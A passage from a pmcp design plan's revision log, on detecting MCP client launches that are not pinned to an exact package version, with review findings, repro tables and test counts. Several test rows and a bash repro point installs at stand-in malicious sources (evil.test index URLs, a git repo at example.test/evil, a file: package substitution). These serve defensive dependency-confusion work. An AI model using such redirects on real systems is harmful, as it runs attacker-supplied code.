  `fetch-retry-mintimeout`, `fetch-timeout`, `maxsockets`. Also allowed: registry
  credentials (`//host/:...`), and `@scope:registry` for a scope other than the pinned
  package's. An empty value is skipped, as npm skips it. The rev-6 93-key allowlist shrinks
  to this, because an entry has no reason to inject anything else. `cache` and `store-dir`
  are no longer on it: dev0 sets them in the **host** environment, which is now trusted
  rather than allowlisted.
- **uv** (`UV_*`): `UV_NO_PROGRESS`, `UV_HTTP_TIMEOUT`, `UV_HTTP_RETRIES` (names checked
  against the uv 0.12.19 binary), and index credentials `UV_INDEX_<NAME>_USERNAME` /
  `_PASSWORD`.
- **cargo** (`CARGO_*`): `CARGO_TERM_COLOR`, `CARGO_TERM_QUIET`, `CARGO_TERM_VERBOSE`,
  `CARGO_TERM_PROGRESS_WHEN`, `CARGO_TERM_PROGRESS_WIDTH`, `CARGO_HTTP_TIMEOUT`,
  `CARGO_NET_RETRY`, `CARGO_BUILD_JOBS`, and the credentials `CARGO_REGISTRY_TOKEN` /
  `CARGO_REGISTRIES_<NAME>_TOKEN`.
- **docker** (`DOCKER_*`): none. Which daemon or config the CLI uses is loud even with a
  digest.

**What stays exactly as revision 6:** the pin grammar and materialiser (`loader.py`, and
so the conformance corpus), per-launcher `_is_exact_pin`, the floating texts (with the
malformed-digest addition), the NB-1 launcher-keyed cause, and the structural npx read
with identity disabled.

**Scope growth.** The code shrinks on the npm side: the npmrc and local-prefix discovery
is removed. It grows by the per-family entry rule, the uvx/cargo flag allowlists, and the
PEP 508 check. Still four source files.

## Rev 6 board findings — before/after, measured

Measured with `repro_r7.py` (appendix), one fresh process per row, against `959d4d4` plus the
revision-6 patch and `959d4d4` plus the revision-7 patch. It runs the real warning
function with a self-hosted relaxer set. "Entry" means the resolved config's env block;
"host" means the gateway's own environment.

| case | rev 6 | rev 7 |
|---|---|---|
| npx `firecrawl-mcp@3.25.5`, **entry** `npm_config_package=file:...` (codex C1 via the entry) | cannot verify | cannot verify: `the entry's env sets npm_config_package` |
| same, **host** `npm_config_package=file:...` | cannot verify | `None`: **documented out of scope** (host is trusted) |
| **entry** `npm_config_cache=/srv/shared` (N1) | `None` | cannot verify: `the entry's env sets npm_config_cache` |
| **entry** `HTTPS_PROXY` (N3) | `None` | cannot verify: `the entry's env sets HTTPS_PROXY` |
| **host** `HTTPS_PROXY` (N3) | `None` | `None` (trusted) |
| uvx `--from cowsay==6.1 cowsay`, **entry** `UV_OVERRIDE` (B2) | `None` | cannot verify: `the entry's env sets UV_OVERRIDE` |
| same, **host** `UV_OVERRIDE` (B2) | `None` | `None` (trusted) |
| uvx `cowsay==6.1`, **entry** `UV_INDEX_URL` (B2) | `None` | cannot verify: `the entry's env sets UV_INDEX_URL` |
| uvx `--index-url http://evil.test/simple cowsay==6.1` (B2) | `None` | cannot verify: `its argv passes --index-url` |
| `cargo install --git https://example.test/evil --version 1.2.3 fc` (B2) | `None` | cannot verify: `its argv passes --git` |
| cargo, **entry** `CARGO_REGISTRIES_X_INDEX` (B2) | `None` | cannot verify: `the entry's env sets CARGO_REGISTRIES_X_INDEX` |
| uvx `--from "firecrawl-py @ https://.../firecrawl_py-9.9.9-py3-none-any.whl#x==1.0.0" fc` (N5) | `None` | `floats on '1.0.0' (not one exact PEP 440 version from an index)` |
| `docker run example/client@sha256:<64 upper-case hex>` (N5) | `floats ... (a docker tag, ...)` | `floats ... (a malformed content digest: docker digests are lower-case hex of the algorithm's length)` |
| `docker run --some-future-flag example/client:3.25.5` (N5) | `None` | cannot verify: `it cannot read which package this 'docker' argv runs` |
| `uvx --some-future-flag cowsay==6.1` (N5) | `None` | cannot verify: `it cannot read which package this 'uvx' argv runs` |
| npx `firecrawl-mcp@3.25.5`, nothing set (control) | `None` | `None` |
| uvx `--from cowsay==6.1 cowsay`, nothing set (control) | `None` | `None` |

The seat's shim rows (B1) and the global-bin file (N2) involve host state only, so
revision 7 is silent there **by design**. The README's trust-boundary paragraph tells the
operator that these are theirs to control.

**Tests:** the revision-7 file has **190 tests** (153 in revision 6; the first rev-7 cut `1073923` had 186, and the cwd ruling adds 4: 3 red on `1073923` plus a control). The revision-6 C1
tests that read host state were replaced: `..._when_the_environment_redirects_npm` and
`..._when_the_server_env_redirects_npm` became `..._when_the_entry_env_redirects_npm` (11
keys × 2 identity modes) and `test_the_host_environment_is_trusted` (5 × 2).
`..._under_a_redirecting_npmrc` became `test_the_hosts_npm_configuration_files_are_trusted`
(5 × 2). The allowlist unit test became `test_which_entry_env_keys_can_redirect`. Against
the revision-6 code the file gives **54 failed, 132 passed**:

- 40 are behaviour changes:
  - host settings now trusted: 6 + 10;
  - the entry's `npm_config_cache`, `HTTPS_PROXY`, `https_proxy` and
    `NODE_EXTRA_CA_CERTS`: 8;
  - uvx entry redirects: 6;
  - cargo entry redirects: 4;
  - the URL requirement: 1;
  - the docker digest label and entry `DOCKER_HOST`: 1;
  - unreadable docker/uvx argvs: 3;
  - the new unit test, which imports rev-7 names: 1.
- 14 are the other entry-env npm ids, which rev 6 also warned on but with the rev-6
  message text (`... is set in the client's environment`).

Against revision 7: **186 passed**.

## Revision 6 (2026-09-27): board round 4 on `6b67f1b`

> **Superseded in part by revision 7.** Revision 7 cuts the host-environment discovery below
> (npmrc files, the local-prefix walk, the host-environment scan) back to the entry's own env
> block, by the maintainer's trust-boundary decision. The C2, NB-1, NB-2 and NB-3
> resolutions stand.

The claude seat returned AGREE with three non-blocking items (NB-1 to NB-3). The codex
seat found two blocking defects (C1, C2). Each was **reproduced first** on the
revision-5 spike, then fixed. Every fix has tests that are red on revision 5 and green on
revision 6, and mutants (M41-M56, plus M10/M17/M40 re-targeted at the new
`_is_exact_pin`). The before/after measurements are in the next section.

| # | finding | resolution | evidence |
|---|---|---|---|
| **C1** (blocking) | An exact-looking argv was taken as proof of a pin while npm's configuration could change what that spec runs. With `npm_config_package=file:<dir>` in the client's environment, `_unpinned_self_hosted_warning` read `firecrawl-mcp@3.25.5` structurally and returned `None`, although npx ran the local package. | **The class, not the instance.** Suppression on an exact npm pin now also requires that **nothing besides the argv can change what npm runs for that spec** (`_npm_redirecting_context`). It is computed from the inputs the warning already holds, never from the resolver's refusal text: the same context produced three different resolver status strings in the repro, depending only on whether an earlier lookup had started the child. It runs in **both** identity modes. Identity (#195) names the package an argv states, judging the server's env overlay, its cwd's local prefix and the gateway's env. The warning asks whether the client that runs is held at that version, so it reads every source npm loads configuration from (Research: *What can change what a registry spec runs*): the overlay keys identity selects (`PATH`/`HOME`/`NODE_PATH`/`NODE_OPTIONS`/`PREFIX`/`nvm_*`), `NODE_OPTIONS` and every non-empty `npm_config_*` in the child's environment, a local prefix, and the project, user, global and builtin npmrc files. An `npm_config_*` key or npmrc key is harmless only if it is on an **allowlist derived key by key from the config definitions of npm 10.9.9 and 11.19.0** (90 defined keys, plus three named undefined ones: pnpm's `store-dir`, and `email`/`always-auth`). The other 91 defined keys, and any key a later npm adds, fail loud. `//host/:` credential keys are harmless; `@scope:registry` is loud only for a package in that scope. The warning names the source: `pmcp cannot verify that its client is pinned: the argv pins firecrawl-mcp@3.25.5, but npm_config_package is set in the client's environment, which can change what npm runs for that spec.` | **Reproduced** (real resolver, real npx, offline temp cache): `npm_config_package=file:<dir> npx -y firecrawl-mcp@3.25.5` printed `LOCAL firecrawl-mcp 0.0.1`, and so did `package=file:<dir>` in `$HOME/.npmrc` and in `<cwd>/.npmrc`. Rev 5 returned `None` for all 9 redirecting contexts measured (overlay `npm_config_package`, overlay `NPM_CONFIG_REGISTRY`, gateway `npm_config_package`, a local prefix, `$HOME/.npmrc`, `<cwd>/.npmrc`, each with the resolver not started, active, or DISABLED). Rev 6 warns "cannot verify" for all of them and names the source. dev0's own `npm_config_cache` + `npm_config_store_dir` stay **silent** on both. Tests: `test_an_exact_argv_is_not_called_pinned_when_the_environment_redirects_npm` (6 keys × 2 identity modes), `..._when_the_server_env_redirects_npm` (2 × 2), `..._under_a_redirecting_npmrc` (5 sources × 2: user, cwd, local prefix, global, builtin), `test_which_npm_config_keys_can_redirect_a_registry_spec`: **27 red on rev 5**. The control `test_settings_that_cannot_redirect_npm_keep_an_exact_pin_silent` (×2) is green on both. Mutants M41, M42, M45-M51, M54-M56. **Revision 7 narrows this:** the redirect is covered when it comes from the **entry's or overlay's env block** (still "cannot verify"). A **host-level** `npm_config_package` (the gateway's own shell environment), host npmrc files and a local project are now **documented out of scope**. Rationale: the maintainer's trust-boundary decision (the host's npm configuration is the operator's, like `PATH`), and round 5 B1, which showed that host discovery through `which`/`realpath` fails open under version-manager shims. The warning fails loud on what an entry controls and does not claim to audit the host. |
| **C2** (blocking) | `_is_exact_pin` ran the generic SemVer check before the docker branch, so `docker run --pull=always example/client:3.25.5` counted as pinned (no warning, and `[PINNED]`). A docker tag can be re-pointed at another image. | `_is_exact_pin` is now a **per-launcher dispatch with no shared rule**, and anything unhandled is not exact. npm: `is_valid_package_version` (build metadata stays exact). docker: a content digest only (`sha256:` + 64 hex, or sha384/sha512), so every tag floats however version-like. pypi (uvx `pkg==X`): one PEP 440 version with no wildcard (`===X` arrives as `=X` and floats). cargo (`--version X`): `is_valid_package_version`, because cargo installs exactly X only when X has no operator (`=1.2.3` floats, conservatively). Every other launcher branch was checked for the same ordering: the rev-5 generic check also made pypi `1.0.0-x.tgzx` and an unknown type's `3.25.5` exact. The same predicate drives the report, so a docker tag is `floating_selector` / `[FLOATING]` and a digest is `pinned_version` / `[PINNED]`. The docker remedy names a digest (`image@sha256:...`). | **Reproduced:** rev 5 gives `_is_exact_pin('docker', '3.25.5') = True`, `_is_exact_pin('pypi', '1.0.0-x.tgzx') = True`, and `docker example/client:3.25.5 -> None`. Rev 6 gives `False`, `False`, and `... floats on '3.25.5' (a docker tag, which can be moved to another image; only an @sha256 digest pins one) ...`. A digest stays silent on both. Tests: `test_exactness_is_decided_per_launcher`, `test_health_warns_on_a_docker_tag_however_version_like`, `test_update_server_reports_a_docker_tag_as_floating`: **3 red on rev 5**. Mutants M43 (the generic check restored first) and M53 (any `sha256:` prefix counts as a digest). |
| **NB-1** | For a launcher identity does not read (`npx.cmd`, `/usr/bin/npx`, `npm.cmd`), the cause text reported the resolver's status, which depends on whether an earlier lookup started the child. | The cause is keyed on the launcher first: `_npm_identity_refusal_cause(command)` returns `pmcp's npm identity check reads only a bare \`npx\`/\`npm\` command, and this one is 'npx.cmd'` for any non-bare command, and consults the resolver only for a bare one. For such a launcher the resolver never ran, which is one more reason C1's context check is computed independently. | Rev 5 says `... (read from the argv: npm package identity is unavailable (gateway_diagnostics.npm_identity: not started ...))` for `npx.cmd`; rev 6 names the launcher. `test_the_cause_names_a_launcher_identity_does_not_read` (4 launchers × 2 resolver states): **8 red on rev 5**. Mutant M44. |
| **NB-2** | "(a range or tag, not one exact version)" mislabels strings that npm releases read differently: npa 13 reads `1.0.0-x.tar-gz` as a version and npa 12 as a file. | `_floating_reason(package_type)` says only what holds: npm `not one exact version on every npm release`; docker `a docker tag, which can be moved to another image; only an @sha256 digest pins one`; pypi `not one exact PEP 440 version`; cargo `cargo reads it as a version requirement, not one exact version`. `update_server` says `'X' does not hold the client at one version (<reason>): a later spawn can run another one`, and `pmcp update` prints `[FLOATING] fc: held at ^3.25.0, which is not one exact version and can resolve to another at a later spawn (latest 3.26.0)`. | `test_the_floating_label_claims_only_what_every_npm_reads` is red on rev 5. Two existing tests changed their expected text (`test_update_server_reports_a_range_as_floating_not_pinned`, `test_pmcp_update_renders_a_range_as_floating`), so they are red on rev 5 too. Mutant M52. |
| **NB-3** | R5-2 attributed 528 to two files. | Corrected in R5-2: `tests/test_gateway_tool_schemas.py` + `tests/test_tools.py` give **416 passed**. 528 was those two plus `tests/test_version_pin.py`'s 112. | Re-measured on the rev-5 spike: `416 passed in 18.71s`. |

**Scope growth.** Still four source files. `handlers.py` gains the per-launcher
`_is_exact_pin`, `_floating_reason`, the npm-context helpers (`_NPM_KEYS_THAT_CANNOT_REDIRECT`,
`_npm_env_config_key`, `_npm_key_can_redirect`, `_npmrc_redirecting_key`,
`_npm_config_files`, `_npm_redirecting_context`) and the launcher-keyed cause. `cli.py` and
`types.py` change wording only. `loader.py` is unchanged from revision 5, so the pin grammar
and the conformance corpus are unaffected (re-run anyway: 0/0 on both npa releases).

## Rev 5 board findings — before/after, measured

Measured this session with `repro_c1.py` and `repro_c2.py` (below) against two trees:
`959d4d4` + the revision-5 patch, and `959d4d4` + the revision-6 patch. Both use the real
npm resolver (npm 11.19.0) and the real warning function, with a self-hosted
`FIRECRAWL_API_URL` set. Each row is one fresh process.

| context (argv `npx -y firecrawl-mcp@3.25.5` unless noted) | resolver status | rev 5 | rev 6 |
|---|---|---|---|
| nothing redirects | `active (npm 11.19.0)` | `None` | `None` |
| gateway env `npm_config_cache` + `npm_config_store_dir` (dev0) | `DISABLED ... ('npm_config_cache' ...)` | `None` | `None` |
| server env `npm_config_package=file:<dir>` | `not started` | `None` | cannot verify: `npm_config_package is set in the client's environment` |
| server env `NPM_CONFIG_REGISTRY=http://127.0.0.1:9/` | `not started` | `None` | cannot verify: `NPM_CONFIG_REGISTRY is set ...` |
| gateway env `npm_config_package=file:<dir>` | `DISABLED ... ('npm_config_package' ...)` | `None` | cannot verify: `npm_config_package is set ...` |
| same server env, after another lookup started the child | `active (npm 11.19.0)` | `None` | cannot verify: `npm_config_package is set ...` |
| cwd inside a node project (`package.json`) | `not started` | `None` | cannot verify: `npm would set a local prefix at <dir> ...` |
| `$HOME/.npmrc` with `package=file:<dir>` | `active (npm 11.19.0)` | `None` | cannot verify: `<home>/.npmrc sets 'package'` |
| `<cwd>/.npmrc` with `package=file:<dir>`, no `package.json` | `active (npm 11.19.0)` | `None` | cannot verify: `<cwd>/.npmrc sets 'package'` |
| `npx.cmd -y firecrawl-mcp` (NB-1) | `not started` | `is unpinned (read from the argv: npm package identity is unavailable (gateway_diagnostics.npm_identity: not started ...))` | `is unpinned (read from the argv: pmcp's npm identity check reads only a bare \`npx\`/\`npm\` command, and this one is 'npx.cmd')` |
| `docker run --pull=always example/client:3.25.5` (C2) | n/a | `None`; `_is_exact_pin('docker', '3.25.5') = True` | `floats on '3.25.5' (a docker tag, which can be moved to another image; only an @sha256 digest pins one)`; `False` |
| `docker run example/client@sha256:<64 hex>` | n/a | `None` | `None` |
| `_is_exact_pin('pypi', '1.0.0-x.tgzx')` (the same ordering bug) | n/a | `True` | `False` |
| `npx -y firecrawl-mcp@1.0.0-x.tar-gz` (NB-2) | n/a | `floats on '1.0.0-x.tar-gz' (a range or tag, not one exact version)` | `floats on '1.0.0-x.tar-gz' (not one exact version on every npm release)` |

**That npm really runs the local package** (C1), measured with npm 11.19.0 against a local
package `firecrawl-mcp@0.0.1` whose bin prints `LOCAL firecrawl-mcp 0.0.1`, with an offline
temp cache:

```bash
npm_config_cache=<tmp> npm_config_offline=true npm_config_package=file:<dir> npx -y firecrawl-mcp@3.25.5
#   -> LOCAL firecrawl-mcp 0.0.1
cd <dir-with-.npmrc: package=file:<dir>> && npm_config_cache=<tmp> npm_config_offline=true npx -y firecrawl-mcp@3.25.5
#   -> LOCAL firecrawl-mcp 0.0.1
HOME=<home-with-.npmrc: package=file:<dir>> npm_config_cache=<tmp> npm_config_offline=true npx -y firecrawl-mcp@3.25.5
#   -> LOCAL firecrawl-mcp 0.0.1
```

**Tests:** the revision-6 file has **153 tests** (112 in revision 5, plus 41 new cases).
Against the revision-5 code it gives **41 failed, 112 passed**. The 41 failures are the 39
new red cases (C1 27, C2 3, NB-1 8, NB-2 1) plus the two existing tests whose NB-2 text
changed. The 112 passes are the 110 revision-5 tests that kept their text, plus the control
`test_settings_that_cannot_redirect_npm_keep_an_exact_pin_silent` in both identity modes,
which is correct on both revisions. Against revision 6: **153 passed**.

## Revision 5 (2026-09-27): re-derived against main `959d4d4`

Main now carries Consiliency/pmcp#299 and Consiliency/pmcp#300. This revision re-derives
the reference patch against `959d4d4`, re-measures everything, and makes no design
change to the feature.

| # | item | resolution | evidence |
|---|---|---|---|
| R5-1 | **The version rule is on main (#299).** `validation.NPM_FILE_TYPE_RE` uses npm 10's `isFileType` (npm-package-arg 12.x; its `.` before `gz` is unescaped, a superset of npm 11's). `is_valid_package_version` bounds each core part at 2**53-1, because node-semver refuses larger ones and npa then reads a dist-tag. | The revision-4 `validation.py` hunk **drops out of the patch**. The pin grammar **uses main's rule and never restates it**: `_parse_version_pin` calls `is_valid_package_version` (plus its own `+` refusal); `split_plain_registry_spec` imports `NPM_FILE_TYPE_RE` for the selector and unscoped-name checks and calls `is_valid_package_version` for the version branch; `_is_exact_pin` calls `is_valid_package_version`. No pin code calls the bare `matches_package_version_grammar`/`is_semver_package_version`. New fixed cases pin the two stricter rules: pin values `1.0.0-x.tar-gz` and `9007199254740992.0.0`, and slot ids `semver-tarball-npm10-tar-gz`, `tarball-npm10-tar-gz` and `oversized-core-is-a-tag`. | `grep -c validation.py` on the reference diff gives **0**. Mutants **M34** (pin value checked with `matches_package_version_grammar`, 7 red), **M35** (the split accepts a bare-grammar version before its file check, 7 red) and **M40** (`_is_exact_pin` on the bare grammar, 1 red) each go red if pin code bypasses main's rule. **Conformance per npa version** (below): **0/0 on both npm-package-arg 12.0.2 and 13.0.2**. The revision-4 rule on the same corpus scored **4,525/13 on 12.0.2** and **50/10 on 13.0.2**, so main's stricter rule is load-bearing for the pin grammar. |
| R5-2 | **Conflict with #300.** #300 asserts that each tool handler validates with its registered input model, by grepping the handler's own source (`tests/test_gateway_tool_schemas.py::test_handler_validates_arguments_with_the_registered_model`). Revision 4's `update_server` wrapper delegated validation to `_update_server_unwarned`, so it went red. | The public `update_server` now calls `UpdateServerInput.model_validate(input_data)` itself and passes the parsed model to `_update_server_unwarned(parsed)`. The behaviour is the same: a validation error raises before any work, exactly as before. `types.py`: the `UpdateServerOutput` hunk's trailing context moved (`AuthConnectInput(GatewayArguments)`), and the same fields are re-applied. Output models are not part of #300's input-schema snapshot, and that snapshot test stays green. | Measured on `959d4d4` + the revision-4 patch: that test fails for `gateway.update_server`. On revision 5, `tests/test_gateway_tool_schemas.py` and `tests/test_tools.py` together give **416 passed** (corrected in revision 6, NB-3: 528 was these two files plus `tests/test_version_pin.py`'s 112). The patch applies cleanly to `959d4d4` (the embedding proof). |
| R5-3 | Disclosure scope. | The plan describes its own feature: pin values, pinned argvs, the warning and the report. The version rule it relies on is described neutrally as "the exact-version check follows npm's classification". | The Revision 4 table and D1/D4 were rewritten to match. |

**Re-measured on the revision-5 spike** (`959d4d4` + patch):

- **Tests:** `tests/test_version_pin.py` has **112 tests**. On `959d4d4` without the
  patch, the file fails at collection (`ImportError: manifest_sources_fingerprint`). With
  a two-symbol import shim it gives **111 failed, 1 passed**; the pass is
  `test_explicit_config_args_win_over_the_manifest_pin`, an inertness guard. With the
  patch: **112 passed**.
- **Mutants:** **40 of 40 red**, each file restored and `cmp`-checked.
- **Full suite:** 4448 passed, 3 skipped, 25 deselected in 443.28s (0:07:23).
- **No-network run:** **1153 passed, 1 deselected** over 20 files (#300 added
  `tests/test_gateway_tool_schemas.py`). The file glob is now `--include='*.py'`, because
  #300's JSON fixture also matches the grep.
- **Neighbouring suites:** **1974 passed, 19 deselected**. These now include
  `tests/test_package_approvals.py` and `tests/test_gateway_tool_schemas.py`.
- **CI gates:** `ruff check`, `ruff format --check` (164 files) and `mypy src/` (50
  files) are all clean.

## Revision 4 (2026-09-26): board round 3 on `e5b5ce2`

The claude seat returned DISAGREE, with one blocker (B1') and four non-blocking items. It
used a 1,081,185-slot generated corpus run through npm's real classifier. Each item was
**reproduced first**, then fixed. Every item has tests that are red on the revision-3
spike and green on revision 4, plus mutants M34-M39. **All 89 revision-3 tests pass on
the revision-3 code**, which proves that the old tests did not cover B1'. The new cases
are **18 red on revision 3** and green now. The numbers below were re-measured on the
revision-4 spike, which was then reverted.

| # | finding | resolution | evidence |
|---|---|---|---|
| **B1'** (blocking) | A **SemVer-shaped tarball** gets through in both directions. npa runs `isFileType` *before* it reads a version, and a strict SemVer prerelease or build tail can end in `.tgz`/`.tar`/`.tar.gz` (`3.25.5-corp.tgz`, `1.0.0-x.TAR`, `3.25.5+b.tar.gz`). **Slot:** `split_plain_registry_spec` accepted such a version before its file check ran. **Pin value:** `_parse_version_pin` accepted `3.25.5-evil.tgz`. | The pin grammar follows npm's order. `split_plain_registry_spec` checks the selector's file suffix **before** any registry reading, and the pin value, the split's version branch and `_is_exact_pin` all use `is_valid_package_version`, whose exact-version check follows npm's classification (tarball-shaped versions are not exact versions). As of revision 5 that check is main's (#299); revision 4 carried an equivalent change in its own patch. | **Reproduced** with the seat's overlays (temp HOME). **Slot:** `9ca081e` keeps `['-y','firecrawl-mcp@3.25.5-corp.tgz']`; **rev 3 gives `version 3.25.6 args ['-y','firecrawl-mcp@3.25.6']`** (silent); **rev 4 gives `version None args ['-y','firecrawl-mcp@3.25.5-corp.tgz']`** plus the WARNING. **Pin value:** **rev 3 gives `firecrawl version 3.25.5-evil.tgz args ['-y','firecrawl-mcp@3.25.5-evil.tgz']`**; **rev 4 gives `version None args ['-y','firecrawl-mcp']`** plus the WARNING. The **generated npm conformance** run finds **0 slot and 0 pin-value violations** on rev 4, against **5,153 and 8** on rev 3 (npa 13.0.2). Tests: the tarball pin values, the `semver-tarball-*` slot ids, `test_a_tarball_shaped_version_is_never_an_exact_pin` (pin grammar and `_is_exact_pin`), and `test_health_warns_on_a_semver_tarball_argv_in_both_identity_modes`. The rev-5 mutants M34/M35/M40 are described in the Revision 5 table. |
| **N-a** | Loose SemVer allows **any** run of leading `v`s, so `vv1`, `vvX`, `v1.X.xbeta` (range) and `vv1.2.3` (version) were accepted as tags. | `_PARTIAL_VERSION_WORD_RE` now allows any run of leading `v`/`V`/`=`, and any loose-prerelease tail with or without a hyphen. The "every range refused" invariant holds, and the conformance run's strict check counts a range with a selector as a violation. | Ids `range-vv`, `range-vvX`, `range-v-xbeta` and `version-vv` are red on rev 3. Mutant M37 (`[vV]?`) gives 3 failed. |
| **N-b** | With identity disabled, `npm exec -y firecrawl-mcp` and `npm exec -- firecrawl-mcp@latest` gave no warning, because the fallback handled only `npx`. | **It fails loud for the whole npm family.** An `npm` launcher (by `normalized_executable_name`) now warns `pmcp cannot verify that its client is pinned: <cause>, and pmcp reads only an npx argv structurally, and this one launches with npm`. npx keeps the structural read. | **Reproduced with the real disabled resolver** (`npm_config_cache` set): rev 3 is `[] (silent)` for both argvs, and rev 4 gives the warning for both. `test_health_fails_loud_for_an_npm_exec_launch_without_identity` is red on rev 3. Mutant M38. |
| **N-c** | The reserved names `node_modules` and `favicon.ico` were accepted, although npa refuses them (validate-npm-package-name `exclusionList`). | Refused case-insensitively, as validate-npm-package-name compares them. | Ids `excluded-node_modules`, `excluded-Node_Modules-versioned` and `excluded-favicon` are red on rev 3. Mutant M36. The corpus includes `Node_Modules` and `FAVICON.ICO`. |
| **N-d** | The fallback said "npm package identity is unavailable" even when identity was **on** and had simply refused a non-registry spec. | `_npm_identity_refusal_cause()` reads `get_resolver().status_summary()`, which never spawns. `active ...` gives `npm's own parser did not identify a registry package in this argv (npm identity is active (npm 11.19.0))`. Anything else gives `npm package identity is unavailable (gateway_diagnostics.npm_identity: <status>)`. | **Reproduced with the real active resolver:** `npx -y firecrawl-mcp@corp.tgz` on rev 3 says "unavailable", and rev 4 names npm's parser. The health test asserts the parser cause and the absence of "unavailable"; the npm-exec test asserts "unavailable" under the disabled fixture. Mutant M39. |

**Generated conformance corpus** (Verification step 10, which replaces the rev-3 461-slot
list). This is the seat's generator, adapted. In revision 4 it was 39 names × (30
prefixes × 33 cores × 36 suffixes), which gives **1,366,139 slots and 35,028 pin
values**; revision 5 enlarges it (see the Revision 5 table and step 10). It adds `vvv`/`v=`
prefixes, `xbeta`/`-X.Tar.Gz`/`+b.tar.gz` suffixes and case variants of the excluded
names. Results against the host's npm-package-arg (npm 11.19.0):

- **rev 4, slots:** accepted 14,526 (`version` 251, `tag` 14,250, bare-name `range *` 25), refused 1,351,613, **SLOT VIOLATIONS 0**.
- **rev 4, pin values:** accepted 8, **PIN VIOLATIONS 0**. The runner exits 0.
- **rev 3, same corpus:** **5,153 slot violations** (300 npa `file`, 3,924 excluded names, 925 ranges with a selector, and 4 bare excluded names that npa reads as nameless tags) and **8 pin violations**.

**Scope growth.** `loader.py` re-orders the selector check and gains the excluded names;
`handlers.py` gains the cause helper and the npm-exec branch. Revision 4 also carried a
`validation.py` change, which main now has (#299), so it is no longer in the patch.

## Revision 3 (2026-09-26): board round 2 on `95968c8`

The claude seat returned DISAGREE with one blocker (B1) and four non-blocking items. It
confirmed every other round-1 resolution and reproduced the round-1 numbers. Each
item below was **reproduced first**, then fixed, and has a test that is red on the
revision-2 spike and green on revision 3, plus a mutant (M25-M33). All numbers were
re-measured on the revision-3 spike, which was then reverted.

| # | finding | resolution | evidence |
|---|---|---|---|
| **B1** (blocking) | Tarball specs slipped through the P1 allowlist. npm treats `name@corp.tgz`, `name@x.tar` and `name@x.tar.gz` (any case), and a bare **unscoped** `corp.tgz` slot, as local tarball **files**. The rev-2 tag regex read them as dist-tags, so `firecrawl-mcp@corp-mcp.TGZ` plus a pin became the public `firecrawl-mcp@3.25.5`: dependency confusion. | npm's own rule, verbatim from npm-package-arg: `isFileType = /[.](?:tgz\|tar\.gz\|tar)$/i`. It is applied to the selector **and** to an unscoped name, exactly where npa applies it; a scoped name is exempt, as in npa. The allowlist was then **re-derived class by class** against npa's classifier (the class table below, in D3), which also closed N4. The rule is pure grammar in the new public `split_plain_registry_spec`. It never consults the resolver, so pins keep working while identity is disabled. | **Reproduced** end to end with the seat's overlay (temp HOME): main `9ca081e` gives `['-y','firecrawl-mcp@corp-mcp.TGZ']`; rev 2 (per the seat, and per the `grammar_conformance` probe below) gives `['-y','firecrawl-mcp@3.25.5']`, silently; **rev 3 gives `version: None args: ['-y','firecrawl-mcp@corp-mcp.TGZ']` plus the WARNING** `Ignoring version pin '3.25.5' for server 'corp-mcp': its args name no plain registry package ...`. **Grammar conformance against the host's real npa** (461 crafted slots): rev-2 rule, **136 violations** (accepted slots that npa classifies as `file`, as `range`, or as invalid); **rev-3 rule, 0 violations**. The P1 test now has one case per npa class (25 ids): **12 red on rev 2** (every tarball form, both bare tarballs, `x`, `X`, `v1.2.x`, and the trailing newline), green on rev 3. A new positive-control test covers 8 accepted classes. Mutant **M26** (drop the name clause) is red on **`bare-tarball-tgz`, `bare-tarball-TAR` and `tarball-name-with-version`**. M25 (drop the selector clause) is red on all 5 tarball-selector ids. |
| **N1** | Two cache-key components had no test: the project overlay and the trust store. | Added `test_fingerprint_changes_when_a_project_overlay_appears` and `test_fingerprint_changes_when_the_project_overlay_is_approved`. The latter uses `approve_project_file`, which changes only the trust store, and asserts that the approved `server_version` then loads. | Mutant **M32** (`parts.append(None)` for the project line) is red on the first test. **M33** (the same for the trust-store line) is red on the second. Before revision 3, both mutants survived (the seat measured 70 passed). |
| **N2** | The warning and `pmcp update` went silent when npm identity was disabled, which is dev0's default (`npm_config_cache`). | **I chose the structural fallback, and it fails loud when that can't decide.** For an npx launch whose identity is refused, the warning reads the slot with the provision gate's `_package_slot` and the same `split_plain_registry_spec` grammar, and says so (`(read from the argv: npm package identity is unavailable)`). An exact pin stays silent. When even the grammar can't name a plain registry package, it warns `pmcp cannot verify that its client is pinned: npm package identity is unavailable (see gateway_diagnostics.npm_identity) ...`. `pmcp update` prints the same warning under its result through the update wrapper. The update result itself is the pre-existing "Could not determine a registry package", because moving a package needs identity (#195) and that stays refused. | **Reproduced** with `npm_config_cache=/tmp/...` set: identity is `('unknown', None)`. rev 2 gives `warnings: []`. **rev 3 gives `'firecrawl' ... npm:firecrawl-mcp is unpinned (read from the argv: npm package identity is unavailable) ...`.** There are 3 tests (unpinned, exact pin, unreadable slot), using the `npm_identity_disabled` fixture. **2 are red on rev 2** (the exact-pin control is green on both). Mutants M29 and M30. |
| **N3** | Build metadata was refused only for manifest pins. A `.pmcp.json` argv `firecrawl-mcp@3.25.5+evil` was labelled `[PINNED] 3.25.5+evil`. | **The label says what npm runs.** A configured argv is the operator's own, so pmcp does not refuse it. `_is_exact_pin` keeps treating it as exact, correctly: npm runs exactly 3.25.5, so the warning stays suppressed. `update_server` now reports `pinned_version="3.25.5"`, compares 3.25.5 against latest, and its message says `(build metadata '+evil' is ignored by npm)`. The same applies to cargo. The manifest path still refuses `+` outright (round-1 N2). | `test_update_server_labels_build_metadata_with_what_npm_runs`: **red on rev 2** (`('3.25.5+evil', 'newer') == ('3.25.5', 'newer')`), green on rev 3. Mutant M31. |
| **N4** (nit) | `latest\n` was accepted (`match` rather than `fullmatch`), and `x`/`X` were accepted as "tags" although npm treats them as ranges. | The tag word is now `fullmatch`. Letter-led version or range words (`x`, `X`, `x.x`, `v1`, `v1.2.x`, `x-beta`) are **refused** by a partial-version-word clause, consistent with refusing every range. The clause is deliberately broad: a real tag it also catches only loses its pin, with a warning. | The P1 test ids `range-x`, `range-X`, `range-v-partial` and `tag-trailing-newline` are red on rev 2. Mutants M27 (range words) and M28 (`match`; red on `tag-trailing-newline` and 7 others). |
| **N5** | This was already documented. | Unchanged, as instructed. | None needed. |

**Scope growth.** There is still no new source file. `loader.py` gains the
`split_plain_registry_spec` grammar (three module regexes), and `handlers.py` gains the
identity-disabled fallback and the build-metadata label.

## Revision 2 (2026-09-26): board round on Consiliency/pmcp#295 @ `9d08184`

The board reached quorum: gemini AGREE, claude PARTIALLY AGREE, codex DISAGREE with 3
blocking findings, and grok timed out. Every finding is resolved below. Each blocking
one was **reproduced first**, then fixed, and is proved by a new test that is red on the
revision-1 spike and green on revision 2, plus a mutant (mutation table, M15-M24). All
